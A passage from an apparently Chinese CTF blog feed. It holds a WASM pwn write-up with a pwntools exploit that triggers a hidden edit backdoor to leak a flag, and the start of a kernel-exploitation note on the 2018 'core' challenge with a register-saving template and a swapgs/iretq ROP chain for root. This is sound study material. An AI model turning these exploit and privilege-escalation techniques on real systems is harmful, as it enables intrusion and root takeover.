class="line">    0x7ffff7fb9000     0x7ffff7fbb000 r--p     2000      0 [anon_7ffff7fb9]</span><br><span class="line">    0x7ffff7fbb000     0x7ffff7fbc000 r-xp     1000      0 [anon_7ffff7fbb]</span><br><span class="line">    0x7ffff7fbc000     0x7ffff7fbe000 r--p     2000      0 [anon_7ffff7fbc]</span><br><span class="line">    0x7ffff7fbe000     0x7ffff7fbf000 r-xp     1000      0 [anon_7ffff7fbe]</span><br><span class="line">    0x7ffff7fbf000     0x7ffff7fc1000 r--p     2000      0 [anon_7ffff7fbf]</span><br><span class="line">    0x7ffff7fc1000     0x7ffff7fc2000 r-xp     1000      0 [anon_7ffff7fc1]</span><br><span class="line">    0x7ffff7fc2000     0x7ffff7fc4000 r--p     2000      0 [anon_7ffff7fc2]</span><br><span class="line">    0x7ffff7fc4000     0x7ffff7fc5000 r-xp     1000      0 [anon_7ffff7fc4]</span><br><span class="line">    0x7ffff7fc5000     0x7ffff7fc6000 r--p     1000      0 [anon_7ffff7fc5]</span><br><span class="line">    0x7ffff7fc6000     0x7ffff7fc7000 ---p     1000      0 [anon_7ffff7fc6]</span><br><span class="line">    0x7ffff7fc7000     0x7ffff7fc9000 rw-p     2000      0 [anon_7ffff7fc7]</span><br><span class="line">    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span><br></pre></td></tr></table></figure><p>可见wtoa程序被映射到了内存空间中</p><p>可执行代码是被映射到</p><p><code>0x7ffff7bff000     0x7ffff7c0b000 r-xp     c000   1000 /home/aichch/pwn/WTOA/wtoa</code></p><p>此外wtoa的模拟堆栈位于</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe77bb1000     0x7ffe77bb3000 rw-p     2000  1b000 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">0x7ffe77bb3000     0x7ffe78bb1000 rw-p   ffe000      0 [anon_7ffe77bb3]</span><br></pre></td></tr></table></figure><p><strong>客户wasm程序的很多数据操作都是基于模拟堆栈,并且是直接使用<u>相对模拟堆栈的地址偏移</u></strong>,更多的会由运行时环境负责</p><h4 id="数据定位"><a href="#数据定位" class="headerlink" title="数据定位"></a>数据定位</h4><p>搜寻一下引入的flag的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search flag&#123;test&#125;</span><br><span class="line">Searching for value: &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[heap]          0x555556fa7cd5 &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[heap]          0x555556fc9190 &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[anon_7ffe77bb3] 0x7ffe780b2b40 &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[anon_7ffe77bb3] 0x7ffe780b2c6d &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[stack]         0x7fffffffe22d &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[stack]         0x7fffffffecb7 &#x27;flag&#123;test&#125;&#x27;</span><br></pre></td></tr></table></figure><p>找到了很多,但是位于wtoa堆栈的只有两个,偏移分别是<code>0x501b40</code>和<code>501c6d</code>,多次调试可以确定这个偏移是不变的</p><p>接下来就是让程序跑起来,可以看见是类似堆的菜单题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">ERROR:: No error information</span><br><span class="line">flag starts with: flag</span><br><span class="line">Note System</span><br><span class="line">[A]dd Note</span><br><span class="line">[E]dit Note</span><br><span class="line">[D]elete Note</span><br><span class="line">[S]how Note</span><br><span class="line">E[X]it</span><br><span class="line">Choice &gt; </span><br></pre></td></tr></table></figure><p>先创建一个Note并定位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search notenote</span><br><span class="line">Searching for value: &#x27;notenote&#x27;</span><br><span class="line">[anon_7ffe77bb3] 0x7ffe780b2cb8 &#x27;notenote&#x27;</span><br></pre></td></tr></table></figure><p>在模拟堆栈中的偏移是<code>0x501cb8</code></p><p>进一步搜寻<code>0x501cb8</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">02:0010│  0x7ffe780b2ca0 ◂— 0x501cb8</span><br><span class="line">03:0018│  0x7ffe780b2ca8 ◂— 0x8</span><br><span class="line">04:0020│  0x7ffe780b2cb0 ◂— 0x1300000000</span><br><span class="line">05:0028│  0x7ffe780b2cb8 ◂— &#x27;notenote&#x27;</span><br></pre></td></tr></table></figure><p>note在内存中的存储结构便大概是这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pointer</span><br><span class="line">size</span><br><span class="line">unknown</span><br><span class="line">content</span><br></pre></td></tr></table></figure><h4 id="函数定位"><a href="#函数定位" class="headerlink" title="函数定位"></a>函数定位</h4><p>正常在输入点断下时</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bt</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x00007ffff7d38607 <span class="keyword">in</span> __GI___readv (fd=0, iov=0x555556fbb5c0, iovcnt=1) at ../sysdeps/unix/sysv/linux/readv.c:26</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  0x0000555556424da4 <span class="keyword">in</span> std::sys::unix::fd::FileDesc::read_vectored () at library/std/src/sys/unix/fd.rs:99</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2  std::sys::unix::fs::File::read_vectored () at library/std/src/sys/unix/fs.rs:1119</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3  &lt;&amp;std::fs::File as std::io::Read&gt;::read_vectored () at library/std/src/fs.rs:810</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">4  0x0000555555b704e0 <span class="keyword">in</span> &lt;wasi_cap_std_sync::stdio::Stdin as wasi_common::file::WasiFile&gt;::read_vectored::&#123;&#123;closure&#125;&#125; () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">5  0x0000555555b93eaf <span class="keyword">in</span> wasi_common::snapshots::preview_1::&lt;impl wasi_common::snapshots::preview_1::wasi_snapshot_preview1::WasiSnapshotPreview1 <span class="keyword">for</span> wasi_common::ctx::WasiCtx&gt;::fd_read::&#123;&#123;closure&#125;&#125; () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">6  0x000055555583be3f <span class="keyword">in</span> &lt;tracing::instrument::Instrumented&lt;T&gt; as core::future::future::Future&gt;::poll () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">7  0x00005555557e3db3 <span class="keyword">in</span> wiggle::run_in_dummy_executor () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">8  0x0000555555859720 <span class="keyword">in</span> &lt;core::panic::unwind_safe::AssertUnwindSafe&lt;F&gt; as core::ops::<span class="keyword">function</span>::FnOnce&lt;()&gt;&gt;::call_once () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">9  0x00005555558bcd04 <span class="keyword">in</span> wasmtime_runtime::instance::Instance::from_vmctx () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">10 0x00005555558eede9 <span class="keyword">in</span> &lt;F as wasmtime::func::IntoFunc&lt;T,(wasmtime::func::Caller&lt;T&gt;,A1,A2,A3,A4),R&gt;&gt;::into_func::native_call_shim () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">11 0x00007ffff7c0a70a <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">12 0x00007fffffffba30 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">13 0x00007ffff7c01f75 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">14 0x00007ffe77bb1000 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">15 0x0000000000501c50 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">16 0x0000000000000000 <span class="keyword">in</span> ?? ()</span></span><br></pre></td></tr></table></figure><p>函数调用栈十分复杂,当然顶上那一批都是wasmtime的调用api</p><p>我们主要关注wtoa映射的部分</p><p>一直<code>finish</code>到代码映射段,之后ni单步</p><p>以add函数为例</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-19_134822.png" alt=""></p><p>这是跳过wasmtime api之后的部分,之后不停的ni</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-19_134958.png" alt=""></p><p>可以看到在ni进入<code>0x7ffff7bff2f0</code>时,底下出现了字符串信息</p><p>那么大致便可以确定<code>0x7ffff7bff2f0-0x7ffff7bff000+0x1000=0x12f0</code>处便是add函数了</p><p>以此类推能得到其他函数的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">menu: 0x2120</span><br><span class="line">add: 0x12F0</span><br><span class="line">delete: 0x19C0</span><br><span class="line">edit: 0x15D0</span><br><span class="line">show: 0x1BA0</span><br><span class="line">exit: 0x2900</span><br></pre></td></tr></table></figure><p>确定完这些主要函数后便能够进入ida开始更多地静态分析了</p><p>不过在此之前还得先确定一些辅助函数</p><p>si进入以上任意一个函数中,继续使用以上的方法</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-19_135922.png" alt=""></p><p>可以判断出以下函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getinput: 0x3EF0</span><br><span class="line">output: 0x3DD0</span><br><span class="line">atoi: 0x2990</span><br></pre></td></tr></table></figure><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>edit函数留有后门，可以直接修改node的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v12 == <span class="number">0x345231</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(v5 + <span class="number">4016</span>) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = *(_DWORD *)(v5 + v4 + <span class="number">44</span>);</span><br><span class="line">    *(_DWORD *)(v5 + v4 + <span class="number">4</span>) = *(_DWORD *)(v5 + v4 + <span class="number">40</span>);</span><br><span class="line">    *(_DWORD *)(v5 + v4) = v14;</span><br><span class="line">    output(a1, a1, <span class="number">1246LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(v20 - <span class="number">96</span>));</span><br><span class="line">    wasm_0_::function_9_(</span><br><span class="line">      a1,</span><br><span class="line">      a1,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v19 + <span class="number">40</span>)</span><br><span class="line">                   + *(_DWORD *)(v5</span><br><span class="line">                               + *(<span class="type">unsigned</span> <span class="type">int</span> *)(v5</span><br><span class="line">                                                 + (<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v5 + *(<span class="type">unsigned</span> <span class="type">int</span> *)(v19 + <span class="number">92</span>) + <span class="number">4</span>)</span><br><span class="line">                                                                + <span class="number">4</span> * *(_DWORD *)(v5 + v4 + <span class="number">44</span>))))),</span><br><span class="line">      <span class="number">48LL</span>);</span><br><span class="line">    *(_DWORD *)(v5 + <span class="number">4016</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果length为0x345231的话可以进入一个特殊分支</p><p>这个分支依然有点难读,不过此时完全可以直接调试来判断后门的功能</p><p>最终<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./launch.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Choice &gt; &#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;size &gt; &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27; &gt; &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, offset, length, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Choice &gt; &#x27;</span>, <span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;offset &gt; &#x27;</span>, <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;length &gt; &#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27; &gt; &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index, offset, length</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Choice &gt; &#x27;</span>, <span class="string">b&#x27;S&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;offset &gt; &#x27;</span>, <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;length &gt; &#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = remote(&#x27;47.100.169.26&#x27;, 20231)</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;AB&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;CD&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x345231</span>, flat(&#123;<span class="number">0x20</span>:<span class="number">0x501b40</span>, <span class="number">0x28</span>:<span class="number">0x100</span>&#125;, filler=<span class="string">b&#x27;\0&#x27;</span>, length=<span class="number">0x30</span>))</span><br><span class="line">show(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">WASM</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="wasm" scheme="https://ixout.github.io/tags/wasm/"/>
    
    <category term="webpwn" scheme="https://ixout.github.io/tags/webpwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel学习笔记1</title>
    <link href="https://ixout.github.io/posts/13785/"/>
    <id>https://ixout.github.io/posts/13785/</id>
    <published>2023-12-28T08:25:43.000Z</published>
    <updated>2024-02-05T14:39:30.550Z</updated>
    
    <content type="html"><![CDATA[<h1 id="强网杯-2018-core"><a href="#强网杯-2018-core" class="headerlink" title="强网杯 2018 - core"></a>强网杯 2018 - core</h1><h2 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h2><p><strong>内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由</strong> <code>system(&quot;/bin/sh&quot;)</code> <strong>变为了</strong> <code>commit_creds(&amp;init_cred)</code> 或 <code>commit_creds(prepare_kernel_cred(NULL))</code>，当我们成功地在内核中执行这样的代码后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。</p><h3 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h3><p>通常情况下，我们的 exploit 需要进入到内核当中完成提权，而我们最终仍然需要<strong>着陆回用户态</strong>以获得一个 root 权限的 shell，因此在我们的 exploit 进入内核态之前我们需要<strong>手动模拟用户态进入内核态的准备工作</strong>——<strong>保存各寄存器的值到内核栈上</strong>，以便于后续着陆回用户态。</p><p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p><blockquote><p>算是一个通用的 pwn 板子。</p><p>方便起见，使用了内联汇编，编译时需要指定参数：<code>-masm=intel</code>。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h3><p>由内核态返回用户态只需要：</p><ul><li><code>swapgs</code>指令恢复用户态 GS 寄存器</li><li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li></ul><p>那么我们只需要在内核中找到相应的 gadget 并执行<code>swapgs;iretq</code>就可以成功着陆回用户态。</p><p>通常来说，我们应当构造如下 rop 链以返回用户态并获得一个 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags //64bit user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><h3 id="swapgs"><a href="#swapgs" class="headerlink" title="swapgs"></a>swapgs</h3><p>交换内核态与用户态的gs寄存器</p><h3 id="iretq-amp-amp-sysretq"><a href="#iretq-amp-amp-sysretq" class="headerlink" title="iretq&amp;&amp;sysretq"></a>iretq&amp;&amp;sysretq</h3><p>这两个指令都是用于返回用户态</p><p>其中iretq等效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br><span class="line">pop cs</span><br><span class="line">pop rflags</span><br><span class="line">pop rsp</span><br><span class="line">pop ss</span><br></pre></td></tr></table></figure><p>sysretq则等效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>首先文件解压出来提供了四个文件,bzImage,core.cpio,start.sh和vmlinux</p><p>其中bzImage是压缩后的内核镜像,去除了大多数的调试符号</p><p>core.cpio是提供给内核的文件系统</p><p>start.sh是启动内核的脚本</p><p>vmlinux则是未经过压缩的静态链接的内核镜像,其中具有更多的调试符号,更利于调试,如果没有这个文件可以利用linus提供的<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>脚本从bzImage中分离出来</p><p>观察以下start.sh启动脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     │ File: ./start.sh</span><br><span class="line">───────┼────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ qemu-system-x86_64 \</span><br><span class="line">   2   │ -m 256M \</span><br><span class="line">   3   │ -kernel ./bzImage \#指定内核镜像</span><br><span class="line">   4   │ -initrd  ./core.cpio \#指定初始的根文件系统</span><br><span class="line">   5   │ -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">   6   │ -s  \#开启调试</span><br><span class="line">   7   │ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">   8   │ -nographic  \#不使用图形化界面</span><br></pre></td></tr></table></figure><p><code>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</code></p><ul><li><code>quiet</code>: 禁用一些冗长的启动消息，以使启动过程更为静默。</li><li><code>kaslr</code>: 表示启用内核地址空间随机化</li></ul><p>解压core.cpio后看一下其中的init文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: init</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/sh</span><br><span class="line">   2   │ mount -t proc proc /proc</span><br><span class="line">   3   │ mount -t sysfs sysfs /sys</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ /sbin/mdev -s</span><br><span class="line">   6   │ mkdir -p /dev/pts</span><br><span class="line">   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">   8   │ chmod 666 /dev/ptmx</span><br><span class="line">   9   │ cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">  10   │ echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  11   │ echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  12   │ ifconfig eth0 up</span><br><span class="line">  13   │ udhcpc -i eth0</span><br><span class="line">  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">  15   │ route add default gw 10.0.2.2 </span><br><span class="line">  16   │ insmod /core.ko</span><br><span class="line">  17   │ </span><br><span class="line">  18   │ #poweroff -d 120 -f &amp;</span><br><span class="line">  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">  20   │ echo &#x27;sh end!\n&#x27;</span><br><span class="line">  21   │ umount /proc</span><br><span class="line">  22   │ umount /sys</span><br><span class="line">  23   │ </span><br><span class="line">  24   │ #poweroff -d 0  -f</span><br></pre></td></tr></table></figure><ul><li><p><code>mount</code>命令用于挂载文件系统</p><ul><li><code>-t</code>选项指定挂载文件系统类型</li><li><code>-o</code>挂载选项</li></ul><p>例如<code>mount -vt devpts -o gid=4,mode=620 none /dev/pts</code>,将<code>devpts</code>文件系统挂载到<code>/dev/pts</code>目录,使用<code>none</code>作为源设备,即不需要源设备文件,挂载的目录的属性为<code>组别4,权限是620</code></p></li><li><p><code>/sbin/mdev</code>是一个轻量级的设备管理工具，通常用于嵌入式 Linux 系统中，用于在系统启动时自动创建和管理设备节点。</p><ul><li><code>-s</code>  ,用于启用 <code>mdev</code> 的守护进程（daemon）模式</li></ul><p>当运行 <code>/sbin/mdev -s</code> 时，<code>mdev</code> 将以守护进程的形式运行，并在后台监听设备的变化。</p></li><li><p><code>ifconfig eth0 up</code> 是一个 Linux 命令，用于启用(激活)网络接口</p></li><li><p><code>umount</code>与<code>mount</code>相反,卸载挂载的文件系统</p></li><li><p><code>setuidgid</code> 是一个busybox提供的一个工具，用于以指定的用户ID启动程序。</p></li><li><p><code>setsid</code>是一个 Unix/Linux 命令，用于启动一个新的会话。这个命令将当前进程设置为新会话的领头进程（session leader）。通常，<code>setsid</code> 用于创建一个与父进程和之前的会话完全脱离的新会话，这对于将进程变成守护进程很有用，因为它与原始终端会话无关。</p><p><code>setsid /bin/cttyhack setuidgid 1000 /bin/sh</code>作用是创建一个新的会话，执行 <code>/bin/cttyhack</code> 工具，然后以用户 ID 1000 的身份启动 <code>/bin/sh</code> shell</p></li><li><p><code>insomod</code>的作用是加载驱动模块,加载后的驱动模块会出现在<code>/sys/module/</code>中</p></li></ul><p>init中比较重要的几点是</p><ul><li>第 9 行中把 <code>kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code> 中，那么我们就能从 <code>/tmp/kallsyms</code> 中读取 